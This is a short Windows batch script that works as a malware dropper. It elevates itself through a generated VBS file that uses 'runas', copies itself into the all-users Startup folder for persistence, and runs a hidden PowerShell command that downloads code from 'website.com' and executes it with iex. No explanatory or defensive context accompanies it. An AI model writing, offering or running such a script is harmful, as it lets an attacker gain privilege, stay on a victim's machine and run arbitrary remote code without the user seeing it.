@echo off
set "params=%*"cd /d "%~dp0" && ( if exist "%temp%\getadmin.vbs" del "%temp%\getadmin.vbs" ) && fsutil dirty query %systemdrive% 1>nul 2>nul || (  echo Set UAC = CreateObject^("Shell.Application"^) : UAC.ShellExecute "cmd.exe", "/k cd ""%~sdp0"" && %~s0 %params%", "", "runas", 1 >> "%temp%\getadmin.vbs" && "%temp%\getadmin.vbs")
copy %0 "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp"
powershell.exe -WindowStyle hidden "$torun = (New-Object System.Net.WebClient).DownloadString('website.com'); iex $torun;"
